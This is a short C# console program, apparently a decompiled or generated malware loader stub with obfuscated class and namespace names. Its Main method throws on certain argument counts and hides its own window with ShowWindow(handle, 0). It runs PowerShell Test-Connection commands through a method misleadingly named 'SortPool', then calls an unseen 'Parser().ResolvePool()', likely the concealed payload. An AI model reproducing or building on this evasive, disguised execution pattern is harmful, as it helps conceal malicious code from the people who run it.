using System;
using System.Diagnostics;
using Insrvhtuhrjlfylhnx.Shared;
using YConsoleApp117all.Configurations;

namespace YConsoleApp117all.Stubs;

public static class ClientMethodStub
{
	[STAThread]
	public static void Main(string[] args)
	{
		if (args.Length == 9)
		{
			throw new Exception();
		}
		if (args.Length == 8)
		{
			throw new Exception();
		}
		if (args.Length == 7)
		{
			throw new Exception();
		}
		if (args.Length == 6)
		{
			throw new Exception();
		}
		if (!Helper.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0))
		{
			Algo.SortPool("Test-Connection www.google.com").WaitForExit();
			Algo.SortPool("Test-Connection www.bing.com").WaitForExit();
			Algo.SortPool("Test-Connection www.yahoo.com").WaitForExit();
		}
		new Parser().ResolvePool();
		Console.ReadLine();
	}
}
